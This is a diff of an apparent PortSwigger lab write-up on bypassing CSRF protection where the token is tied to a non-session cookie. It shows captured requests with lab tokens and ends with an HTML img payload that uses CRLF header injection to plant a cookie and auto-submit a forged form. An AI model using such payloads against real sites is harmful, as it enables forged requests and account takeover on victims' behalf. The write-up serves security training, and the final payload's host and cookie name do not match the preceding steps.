@@ -30,15 +30,75 @@ could be leveraged to place a cookie that is submitted to secure.normal-website.
 
 ## Solution :
 
+
+If we update the email of wiener, browser sends a request like this.
+
+
+
+```http
+POST /my-account/change-email HTTP/2
+Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
+Cookie: session=ZPFZy0o8QHUK2RTfyaHqKIAbc97aoQd; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
+Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=wiener
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+email=user1%40user.net&csrf=I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD
+```
+
+We see that there is a **csrf token parameter in the body of the request & a csrfkey cookie in the header**. Both has two different values.
+
+
+
+If we change the cookie value, then we get logged out.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/70cb63c0-8c3b-488f-bb16-5cc961e6024e)
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b6414afc-90af-422d-be95-a04c202c32d2)
+
+**If we log in again, we get the same csrf token & also the same csrfkey as before but different session cookie.**
+
+```http
+POST /my-account/change-email HTTP/2
+Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
+Cookie: session=ittvGu6fBbmpHK5rPxvZDCGA8SEFOafP; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
+Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=wiener
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+email=test%40test.com&csrf=I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD
+```
+
+From this we can understand that system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync.
+
 **First let's login as wiener -**
 
-- On viewing the page source, we can fint he csrf token of wiener - `ZvJ76rK5LcD1LqPUkIRLAjmEptJMIFon`
+- On viewing the page source, we can fint he csrf token of wiener - `I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD`
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/021d2c3a-ea2f-4120-964c-20bb29300dfb)
-
-- Click on inspect element & we can see that in the cookies we have the csrfkey - `wa8IFRWwagWFenyNJRLtl342K9U5uikc`
-
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1c63b2c5-e8ad-48d2-98ac-87a274abeaed)
+- Click on inspect element & we can see that in the cookies we have the csrfkey - `yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc`
 
 
 **Log in as carlos -**
@@ -49,17 +109,17 @@ Update carlos's email & capture the request,
 
 ```http
 POST /my-account/change-email HTTP/2
-Host: 0ae700c80376e89582c41b7200b8004a.web-security-academy.net
-Cookie: session=RXZrYLgsaGTzXBCU1EKoEmhCU1scqX6W; csrfKey=nKlGR3jzyFUMsIPM7RJ8ZxDE6yHSP2k7
+Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
+Cookie: session=cV2AxFTpez3Xml0BLiEx86RJUIXHDn7T; csrfKey=hCSFtEnq0dVU2t8DajouPWfooHhpPi2q
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 59
-Origin: https://0ae700c80376e89582c41b7200b8004a.web-security-academy.net
+Content-Length: 60
+Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
 Dnt: 1
-Referer: https://0ae700c80376e89582c41b7200b8004a.web-security-academy.net/my-account?id=carlos
+Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=carlos
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
@@ -67,12 +127,24 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
 Te: trailers
 
-email=test%40test.com&csrf=LcvnVlPGvy3TnwCkfhhKPe60IEu1JcAD
+email=test2%40test.net&csrf=FxkOmuSSG0XT01gCwdw8pDbTl1wcRGdW
 ```
 
-- Carlos's csrfkey - `nKlGR3jzyFUMsIPM7RJ8ZxDE6yHSP2k7`
-- Carlos's csrf token - `LcvnVlPGvy3TnwCkfhhKPe60IEu1JcAD`
+- Carlos's csrf token - `FxkOmuSSG0XT01gCwdw8pDbTl1wcRGdW`
+- Carlos's csrfkey - `hCSFtEnq0dVU2t8DajouPWfooHhpPi2q`
 
-Let's try to replace the csrf token and csrf key of carlos with that of wiener's to see if we can bypass the csrf protection by providing another pair/set of valid tokens.
+If we replace only the csrf token & csrf key of carlos's with wiener, the request gets accepted & the email of carlos is changed as expected.
 
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6451487d-2e12-4431-8748-f9e3f3b1c3fb)
+
+#### Inject csrfkey cookie value by HTTP header injection
+
+Send the above request to POC generator.
+
+> Note that we have only changed the csrf token value to **anytoken**. The csrfkey value is still the same. It will have to be injected into victim's session. For this we can use a `<img>` tag, where we load the url along with HTTP header injection payload to inject the csrfkey value as anytoken . Since there is no image in that url , it will trigger an error. On error it will submit the form.
+
+
+```html
+<img src="https://0aa7009804198f7480e676da00a90003.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+```
 
